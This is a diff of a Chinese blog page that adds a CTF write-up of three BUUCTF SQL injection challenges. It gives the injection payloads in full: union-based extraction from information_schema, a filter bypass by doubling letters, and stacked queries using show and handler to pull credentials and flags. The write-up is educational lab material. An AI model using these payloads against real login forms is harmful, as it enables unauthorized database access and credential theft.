@@ -471,7 +471,52 @@
                 <h2 id="极客大挑战-2019-BabySQL-1"><a href="#极客大挑战-2019-BabySQL-1" class="headerlink" title="[极客大挑战 2019]BabySQL 1"></a>[极客大挑战 2019]BabySQL 1</h2><p>打开题目，看见作者给出了提示，过滤。</p>
 <span id="more"></span>
 
-<p><img src="https://raw.githubusercontent.com/lzb1055057377/lzb1055057377.github.io/img/20210331113428.PNG" alt="101"></p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/101.PNG" alt="101"></p>
+<p>尝试随便输入一些先试试。</p>
+<p>username=admin&amp;password=pwd’order by 1#</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/102.PNG" alt="102"></p>
+<p>看来or和by被过滤了。在原语句被过滤的词中间都插一个or,来绕过过滤，username=admin&amp;password=pwd’oorrder bory 4#。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/103.PNG" alt="103"></p>
+<p>得到有3个字段，继续查回显点，被遇到过滤的词就在中间插or。username=admin&amp;password=pwd’unorion selorect 1,2,3#。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/104.PNG" alt="104"></p>
+<p>爆库名。username=admin&amp;password=pwd’unorion selorect 1,2,database()#。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/105.PNG" alt="105"></p>
+<p>爆表名。username=admin&amp;password=pwd’unorion sorelect 1,2,group_concat(table_name) forrom%20(infoorrmation_schema.tables) worhere table_schema=database()#。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/106.PNG" alt="106"></p>
+<p>爆列名。username=admin&amp;password=pwd’unioron selorect 1,2,group_concat(column_name) frorom infoorrmation_schema.columns worhere table_schema=database() anord table_name=’b4bsql’#。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/107.PNG" alt="107"></p>
+<p>获得字段数据拿到flag。username=admin&amp;password=pwd’uornion seleorct 1,2,group_concat(passwoorrd) frorom b4bsql#。</p>
+<hr>
+<h2 id="极客大挑战-2019-LoveSQL-1"><a href="#极客大挑战-2019-LoveSQL-1" class="headerlink" title="[极客大挑战 2019]LoveSQL 1"></a>[极客大挑战 2019]LoveSQL 1</h2><p>打开题目是个登陆页面，账号admin密码pwd随便输，先找注入点。</p>
+<p>输入username=admin&amp;password=pwd’order by 1#后没有报错，可以查字段，最后发现有3个字段。</p>
+<!--more-->
+
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/201.PNG" alt="201"></p>
+<p>使用union查询回显的位置，username=admin&amp;password=pwd’union select 1,2,3#，回显位置在2和3。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/202.PNG" alt="202"></p>
+<p>没有发现过滤，接下来就简单了。username=admin&amp;password=pwd’union select 1,2,group_concat(schema_name) from (information_schema.schemata)#，查库名。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/203.PNG" alt="203"></p>
+<p>username=admin&amp;password=pwd’union select 1,2,group_concat(table_name) from (information_schema.tables) where table_schema=database()#，得到表名。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/204.PNG" alt="204"></p>
+<p>username=admin&amp;password=pwd’union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’#，得到字段名。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/205.PNG" alt="205"></p>
+<p>username=admin&amp;password=pwd’union select 1,group_concat(username),group_concat(password) from l0ve1ysq1#，得到flag。</p>
+<p>注：#在url地址栏中都要用%23代替。</p>
+<hr>
+<h2 id="BUUCTF-强网杯-2019-随便注"><a href="#BUUCTF-强网杯-2019-随便注" class="headerlink" title="BUUCTF[强网杯 2019]随便注"></a>BUUCTF[强网杯 2019]随便注</h2><p>打开题目看见如下界面。</p>
+<!--more-->
+
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/301.PNG" alt="301"></p>
+<p>先尝试输入一下，1’报错，而1’#没有报错，是采用单引号闭合。</p>
+<p>输入1’ union select database()#试试水，发现存在过滤。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/302.PNG" alt="302"></p>
+<p>select被过滤，尝试采用堆叠注入，使用1’;show databases;#进行查询。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/303.PNG" alt="303"></p>
+<p>成功得到数据库名，这个方法可行。继续输入1’;show tables;#查表，发现两个表。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/304.PNG" alt="304"></p>
+<p>继续查两个表的字段，1’;show columns from<code>1919810931114514</code>#，在1919810931114514表中发现flag。</p>
+<p><img src="/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/305.PNG" alt="305"></p>
+<p>查字段时还可使用1’;desc <code>1919810931114514</code>#语句或者1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;#语句，都可以获得字段的内容。</p>
 
                 
             </div>
@@ -707,9 +752,53 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/03/31/csrf%E7%AC%94%E8%AE%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="csrf笔记">
+                        
+                        <span class="card-title">csrf笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            csrf笔记csrf（跨站请求伪造）被称为one-click  attack，是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。(摘自百度百科)
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-31
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/csrf-ctf/">
+                        <span class="chip bg-color">csrf ctf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
                 <a href="/2021/03/31/BUUCTF-SQL%E6%B3%A8%E5%85%A5WP%E5%90%88%E9%9B%86/">
@@ -747,43 +836,6 @@
                         <span class="chip bg-color">ctf SQL注入</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/03/30/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-30
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            John Doe
-                            
-                        </span>
-                    </div>
                 </div>
                 
             </div>
